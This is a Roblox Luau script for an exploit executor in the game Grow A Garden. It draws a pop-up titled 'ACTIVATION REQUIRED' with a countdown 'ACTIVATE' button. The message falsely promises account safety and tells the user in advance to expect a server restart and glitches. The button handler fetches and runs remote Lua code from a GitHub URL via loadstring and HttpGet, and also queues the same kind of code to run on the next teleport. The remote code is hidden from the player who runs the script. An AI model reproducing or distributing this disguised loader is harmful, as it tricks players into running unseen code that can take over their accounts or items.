local gui = Instance.new("ScreenGui")
gui.Name = "PocariGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 320, 0, 240)
mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.ClipsDescendants = true

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 8)
mainCorner.Parent = mainFrame

local mainBorder = Instance.new("UIStroke")
mainBorder.Color = Color3.fromRGB(100, 150, 255)
mainBorder.Thickness = 2
mainBorder.Parent = mainFrame

local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 32)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
titleBar.ClipsDescendants = true

local titleBarCorner = Instance.new("UICorner")
titleBarCorner.CornerRadius = UDim.new(0, 8)
titleBarCorner.Parent = titleBar

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "ACTIVATION REQUIRED"
title.Font = Enum.Font.FredokaOne
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(255, 120, 120)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 200, 1, 0)
title.Position = UDim2.new(0, 12, 0, 0)
title.TextXAlignment = Enum.TextXAlignment.Left

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Text = "×"
closeButton.Font = Enum.Font.GothamSemibold
closeButton.TextSize = 22
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 80)
closeButton.Size = UDim2.new(0, 28, 0, 28)
closeButton.Position = UDim2.new(1, -32, 0, 2)
closeButton.BorderSizePixel = 0

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeButton

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.BackgroundTransparency = 1
contentFrame.Size = UDim2.new(1, -16, 1, -60)
contentFrame.Position = UDim2.new(0, 8, 0, 40)

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, 0, 1, 0)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 255)
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 8)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrollFrame

local warningLabel = Instance.new("TextLabel")
warningLabel.Name = "WarningLabel"
warningLabel.Text = "Whoops! Stop Right There, We Need Your Executor To Be Activated First..."
warningLabel.Font = Enum.Font.FredokaOne
warningLabel.TextSize = 16
warningLabel.TextColor3 = Color3.fromRGB(255, 120, 120)
warningLabel.BackgroundTransparency = 1
warningLabel.Size = UDim2.new(1, 0, 0, 0)
warningLabel.AutomaticSize = Enum.AutomaticSize.Y
warningLabel.TextWrapped = true
warningLabel.TextXAlignment = Enum.TextXAlignment.Center
warningLabel.LayoutOrder = 1

local messageLabel = Instance.new("TextLabel")
messageLabel.Name = "MessageLabel"
messageLabel.Text = "Before you can access the exploits/vulnerabilities your executor must be activated first. Why is that needed? It is to make sure your account will be 1,000,000% SAFE! Executors doesn't guarantees your safety especially towards Grow A Garden Soft Bans (ex. Trade Failed, Data Loss, etc.) because they have nothing to do with your account in the first place, now during this activation it will restart your server to the most optimal ones (if you think Private Server is safe then you are wrong, its easier to track you in the Private Server than the Public Server). After the Server Restart you are good to go sometimes it might bug your character and its fine, it is natural to bug and glitch sometimes since you are doing it with other people in the same server. To Continue, please press the Activate Button below this message. ~pocari ;)"
messageLabel.Font = Enum.Font.GothamSemibold
messageLabel.TextSize = 12
messageLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
messageLabel.BackgroundTransparency = 1
messageLabel.Size = UDim2.new(1, 0, 0, 0)
messageLabel.AutomaticSize = Enum.AutomaticSize.Y
messageLabel.TextWrapped = true
messageLabel.LayoutOrder = 2

local buttonContainer = Instance.new("Frame")
buttonContainer.Name = "ButtonContainer"
buttonContainer.BackgroundTransparency = 1
buttonContainer.Size = UDim2.new(1, 0, 0, 40)
buttonContainer.LayoutOrder = 3

local activateButton = Instance.new("TextButton")
activateButton.Name = "ActivateButton"
activateButton.Text = "ACTIVATE (7)"
activateButton.Font = Enum.Font.FredokaOne
activateButton.TextSize = 16
activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
activateButton.BackgroundColor3 = Color3.fromRGB(200, 60, 80)
activateButton.Size = UDim2.new(0.8, 0, 0.8, 0)
activateButton.Position = UDim2.new(0.1, 0, 0.1, 0)
activateButton.AnchorPoint = Vector2.new(0.5, 0.5)
activateButton.Position = UDim2.new(0.5, 0, 0.5, 0)
activateButton.BorderSizePixel = 0
activateButton.AutoButtonColor = false
activateButton.Active = false

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = activateButton

local buttonStroke = Instance.new("UIStroke")
buttonStroke.Color = Color3.fromRGB(255, 180, 180)
buttonStroke.Thickness = 2
buttonStroke.Parent = activateButton

local watermark = Instance.new("TextLabel")
watermark.Name = "Watermark"
watermark.Text = "created by pocari"
watermark.Font = Enum.Font.FredokaOne
watermark.TextSize = 12
watermark.TextColor3 = Color3.fromRGB(150, 150, 180)
watermark.BackgroundTransparency = 1
watermark.Size = UDim2.new(1, 0, 0, 16)
watermark.Position = UDim2.new(0, 0, 1, -16)
watermark.TextYAlignment = Enum.TextYAlignment.Top

local userInput = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local runService = game:GetService("RunService")

local dragStart
local startPos
local isDragging = false

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
end)

local function updateDrag(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X,
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                isDragging = false
                connection:Disconnect()
            end
        end)
    end
end)

userInput.InputChanged:Connect(function(input)
    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateDrag(input)
    end
end)

closeButton.MouseButton1Click:Connect(function()
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad)
    tweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}):Play()
    tweenService:Create(titleBar, tweenInfo, {BackgroundTransparency = 1}):Play()
    tweenService:Create(watermark, tweenInfo, {TextTransparency = 1}):Play()
    task.wait(0.3)
    gui:Destroy()
end)

closeButton.MouseEnter:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(220, 80, 100)
end)

closeButton.MouseLeave:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 80)
end)

activateButton.MouseEnter:Connect(function()
    if activateButton.Active then
        tweenService:Create(activateButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 80, 100)}):Play()
    end
end)

activateButton.MouseLeave:Connect(function()
    if activateButton.Active then
        tweenService:Create(activateButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 60, 80)}):Play()
    end
end)

local pulseTween = tweenService:Create(
    mainBorder,
    TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {Color = Color3.fromRGB(255, 120, 120)}
)
pulseTween:Play()

local buttonPulse = tweenService:Create(
    buttonStroke,
    TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {Color = Color3.fromRGB(255, 255, 255)}
)
buttonPulse:Play()

mainFrame.BackgroundTransparency = 1
mainFrame.Size = UDim2.new(0, 10, 0, 10)
mainFrame.Position = UDim2.new(0.5, -5, 0.5, -5)

local openTween = tweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
    Size = UDim2.new(0, 320, 0, 240),
    Position = UDim2.new(0.5, -160, 0.5, -120),
    BackgroundTransparency = 0
})
openTween:Play()

local counter = 7
local countdownConnection
countdownConnection = runService.Heartbeat:Connect(function()
    if counter > 0 then
        counter -= 1
        activateButton.Text = "ACTIVATE ("..counter..")"
        if counter == 0 then
            activateButton.Active = true
            activateButton.Text = "ACTIVATE NOW"
            activateButton.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
            buttonStroke.Color = Color3.fromRGB(180, 255, 180)
            tweenService:Create(activateButton, TweenInfo.new(0.5), {BackgroundColor3 = Color3.fromRGB(60, 160, 60)}):Play()
            countdownConnection:Disconnect()
        end
    end
end)

activateButton.MouseButton1Click:Connect(function()
    queue_on_teleport([[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/visual.lua"))()
    ]])
    task.wait(5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
    if activateButton.Active then
        activateButton.Active = false
        tweenService:Create(activateButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(50, 50, 50), TextTransparency = 0.5}):Play()
        activateButton.Text = "ACTIVATING..."
        task.wait(1.5)
        gui:Destroy()
    end
end)

warningLabel.Parent = scrollFrame
messageLabel.Parent = scrollFrame
buttonContainer.Parent = scrollFrame
activateButton.Parent = buttonContainer
scrollFrame.Parent = contentFrame
watermark.Parent = mainFrame
contentFrame.Parent = mainFrame
closeButton.Parent = titleBar
title.Parent = titleBar
titleBar.Parent = mainFrame
mainFrame.Parent = gui
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
